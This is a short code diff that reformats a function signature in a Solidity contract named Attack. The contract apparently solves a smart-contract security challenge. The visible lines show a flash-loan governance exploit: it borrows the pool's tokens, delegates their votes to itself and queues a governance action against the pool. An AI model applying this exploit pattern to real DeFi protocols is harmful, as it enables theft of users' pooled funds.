@@ -98,7 +98,13 @@ contract Attack is IERC3156FlashBorrower {
         pool.flashLoan(this, address(token), TOKENS_IN_POOL, data);
     }
 
-    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata data) external override returns (bytes32) {
+    function onFlashLoan(
+        address,
+        address,
+        uint256 amount,
+        uint256,
+        bytes calldata data
+    ) external override returns (bytes32) {
         token.delegate(address(this));
         token.approve(address(pool), amount);
         governance.queueAction(address(pool), 0, data);
